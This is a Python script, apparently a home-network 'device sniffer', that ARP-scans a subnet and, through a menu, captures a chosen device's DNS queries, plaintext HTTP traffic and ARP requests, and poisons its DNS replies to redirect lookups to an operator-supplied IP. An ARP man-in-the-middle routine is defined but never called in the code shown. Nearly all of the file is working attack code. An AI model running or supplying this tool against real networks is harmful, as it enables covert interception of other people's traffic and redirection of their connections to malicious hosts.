#!/usr/bin/env python3

import argparse
import threading
from colorama import Fore, Style
from time import strftime, localtime
from scapy.all import arp_mitm, sniff, DNS, srp, Ether, ARP, send, IP, UDP, DNSRR
from mac_vendor_lookup import MacLookup, VendorNotFoundError

parser = argparse.ArgumentParser(description='Device network sniffer')
parser.add_argument('--network', help='Network to scan (eg "192.168.0.0/24")',
                    required=True)
parser.add_argument('--iface', help='Network interface to use', required=True)
parser.add_argument('--routerip', help='IP of your home router ', required=True)
opts = parser.parse_args()

def arp_scan(network, iface):
    """
    Performs ARP ping across the local subnet. Once a device responds, its IP
    and MAC address will be recorded. MAC address lookup will also be performed
    against the pre-defined OUI in https://standards-oui.ieee.org/oui/oui.txt.
    """
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network),
                     timeout=5, iface=iface)
    print(f'\n{Fore.RED}######## NETWORK DEVICES ########{Style.RESET_ALL}\n')
    for i in ans:
        mac = i.answer[ARP].hwsrc
        ip = i.answer[ARP].psrc
        try:
            vendor = MacLookup().lookup(mac)
        except VendorNotFoundError:
            vendor = 'unrecognized device'
        print(f'{Fore.BLUE}{ip}{Style.RESET_ALL} ({mac}, {vendor})')
    print(f'{Fore.YELLOW}0. Exit{Style.RESET_ALL}')
    return input('\nPick a device IP: ')

class Device:
    def __init__(self, routerip, targetip, iface):
        self.routerip = routerip
        self.targetip = targetip
        self.iface = iface

    def mitm(self):
        while True:
            try:
                arp_mitm(self.routerip, self.targetip, iface=self.iface)
            except OSError:
                print('IP seems down, retrying ..')
                continue

    def capture_dns(self):
        sniff(iface=self.iface, prn=self.dns,
              filter=f'src host {self.targetip} and udp port 53')

    def dns(self, pkt):
        record = pkt[DNS].qd.qname.decode('utf-8').strip('.')
        time = strftime("%m/%d/%Y %H:%M:%S", localtime())
        print(f'[{Fore.GREEN}{time} | {Fore.BLUE}{self.targetip} -> {Fore.RED}{record}{Style.RESET_ALL}]')

    def arp_sniff(self):
        def arp_pkt_callback(pkt):
            if pkt.haslayer(ARP) and pkt[ARP].op == 1:  # ARP request
                print(f'{Fore.YELLOW}ARP Sniff: {pkt[ARP].psrc} -> {pkt[ARP].pdst}{Style.RESET_ALL}')
        sniff(iface=self.iface, prn=arp_pkt_callback, filter=f'arp and host {self.targetip}')

    def http_sniff(self):
        def http_pkt_callback(pkt):
            if pkt.haslayer('Raw'):
                print(f'{Fore.MAGENTA}HTTP Packet: {pkt["Raw"].load}{Style.RESET_ALL}')
        sniff(iface=self.iface, prn=http_pkt_callback, filter=f'tcp port 80 and host {self.targetip}')

    def dns_poison(self, spoof_ip):
        def dns_pkt_callback(pkt):
            if pkt.haslayer(DNS) and pkt[DNS].qr == 0:  # DNS query
                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                              UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                              DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                  an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=spoof_ip))
                send(spoofed_pkt, iface=self.iface)
                print(f'{Fore.RED}DNS Poison: Redirected {pkt[DNS].qd.qname.decode()} to {spoof_ip}{Style.RESET_ALL}')
        sniff(iface=self.iface, prn=dns_pkt_callback, filter=f'udp port 53 and host {self.targetip}')

    def sniff(self):
        while True:
            print(f'\n{Fore.GREEN}Select Your Choice:{Style.RESET_ALL}')
            print(f'1. DNS Sniff\n2. HTTP Sniff\n3. DNS Poison\n4. ARP Sniff\n5. Exit')
            choice = int(input(f'{Fore.BLUE}Your choice: {Style.RESET_ALL}'))
            if choice == 1:
                self.capture_dns()
            elif choice == 2:
                self.http_sniff()
            elif choice == 3:
                spoof_ip = input(f'{Fore.RED}Enter spoofed IP: {Style.RESET_ALL}')
                self.dns_poison(spoof_ip)
            elif choice == 4:
                self.arp_sniff()
            elif choice == 5:
                print(f'{Fore.YELLOW}Exiting...{Style.RESET_ALL}')
                break
            else:
                print(f'{Fore.RED}Invalid choice, try again.{Style.RESET_ALL}')

if __name__ == '__main__':
    while True:
        targetip = arp_scan(opts.network, opts.iface)
        if targetip == "0":
            print(f'{Fore.YELLOW}Exiting...{Style.RESET_ALL}')
            break
        device = Device(opts.routerip, targetip, opts.iface)
        try:
            device.sniff()
        except KeyboardInterrupt:
            print(f'\n{Fore.CYAN}Returning to menu...{Style.RESET_ALL}')
            continue
